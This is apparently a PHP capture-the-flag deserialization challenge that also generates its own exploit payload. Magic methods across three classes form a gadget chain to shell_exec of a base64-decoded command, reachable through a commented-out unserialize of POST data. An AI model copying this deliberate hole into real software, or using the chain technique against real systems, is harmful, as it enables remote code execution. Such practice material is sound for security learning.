<?php

class III{

    public $where="unserialize";
    public $shell='ZWNobyAiZmxhZyBpbiAvZmZmbGxsYWFhZ2dnIj5oaW50LnR4dA';

    public function shellme() {


        if (strlen($this->shell)>10)
            echo "toooo long!!!";
        else{
            // var_dump(base64_decode($this->shell));
            shell_exec(base64_decode($this->shell));
            return "well done！";
        }
    }
    public function __construct($a){
        if($a==1){
            $this->where =  new UUU(1);
        }
        else{
            $this->shell = "hp";
        }
    }

    public function __destruct() {
        // echo "Wellcome to ".$this->where;
    }
}

class LLL{

    public $func;
    protected $getgetgetit;

    public function __call($func, $args) {

        if(strpos($func, 'shellme') !== false)
            return "You are too lazy!";
        else
            return call_user_func([$this, $func.'ser'], $args);
    }

    public function __construct(){
        $this->getgetgetit =  new UUU(0);
    }

    public function __get($code){

        $this->getgetgetit->$code = "my hand";
        // return $this->getgetgetit->$code;
    }

    protected function ezser(){
        return "I well shell you by ".$this->doit;
    }
}


class UUU{

    private $setsetset;
    public $dododo;
    public $func;

    public function __toString(){
        return $this->func->ez();
    }

    public function __construct($a){
        if($a==1){
            $this->func =  new LLL();
        }
        else{
            $this->dododo = [new III(0),'shellme'];
        }
    }

    public function __set($name, $value){
        // echo "***get****";
        var_dump($this->dododo);
        $this->setsetset = ($this->dododo)();
        return $this->setsetset;
    }
}


// unserialize(serialize(new III(1)));

echo urlencode(serialize(new III(1)));

// if (isset($_POST["ser"])) {
//     $a=unserialize($_POST['ser']);
//     throw new Exception("so easy!");
// }
// else {
//     highlight_file(__FILE__);
// }


